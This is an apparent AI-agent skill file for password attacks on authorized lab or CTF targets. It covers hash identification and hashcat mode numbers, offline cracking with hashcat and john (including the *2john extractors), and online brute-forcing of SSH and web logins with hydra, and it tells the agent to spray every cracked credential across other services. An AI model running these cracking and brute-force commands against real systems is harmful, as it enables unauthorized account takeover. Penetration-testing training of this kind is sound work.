---
name: password-attacks
description: >-
  Cracking hashes and brute-forcing logins on an authorized lab/CTF/owned
  target — identifying a hash, cracking it with john or hashcat, and online
  brute-forcing services with hydra. Use when you have captured a hash or a
  hashed-password file, or {{OWNER}} asks you to "crack this", "brute force the
  login", or get past a credential prompt on a lab box.
---

# Password attacks

Authorized lab/CTF/owned target only — hashes you captured from a box you are
authorized to test, or a login on that box. `hydra`, `john` (john-jumbo),
`hashcat` may need installing. `rockyou.txt` is the default wordlist (ships with
SecLists, or `/opt/homebrew/share/wordlists`).

## Identify before you crack

The hash format decides the tool mode. Look at length and structure:
`$1$`=MD5crypt, `$5$`=SHA256crypt, `$6$`=SHA512crypt, `$2a/2b$`=bcrypt,
`$y$`=yescrypt, 32 hex=MD5/NTLM, 40 hex=SHA1. Use `hashid`/`hash-identifier` if
present, or match by eye. Note the corresponding `hashcat -m` mode
(0=MD5, 100=SHA1, 1000=NTLM, 1800=sha512crypt, 3200=bcrypt, 500=md5crypt).

## Crack offline

```bash
# hashcat (GPU, fast) — put the raw hash in hash.txt
hashcat -m MODE -a 0 hash.txt rockyou.txt
hashcat -m MODE hash.txt --show           # print cracked results

# john (handles many formats, has *2john helpers)
john --wordlist=rockyou.txt hash.txt
john --show hash.txt
# *2john extractors turn a file into a crackable hash:
#   ssh2john id_rsa > h ; zip2john f.zip > h ; keepass2john f.kdbx > h
```

## Brute-force a login online

Loud but effective on a lab box. Use a known username where you have one; spray
found passwords across users.
```bash
hydra -l USER -P rockyou.txt ssh://TARGET
hydra -L users.txt -P pass.txt TARGET http-post-form \
  "/login:user=^USER^&pass=^PASS^:F=incorrect"
hydra -l admin -P rockyou.txt TARGET -s PORT http-get /protected
```
Throttle with `-t 4` if a service falls over. Every cracked or reused
credential goes in the engagement log and gets sprayed at every other service
and user — reuse is the point.
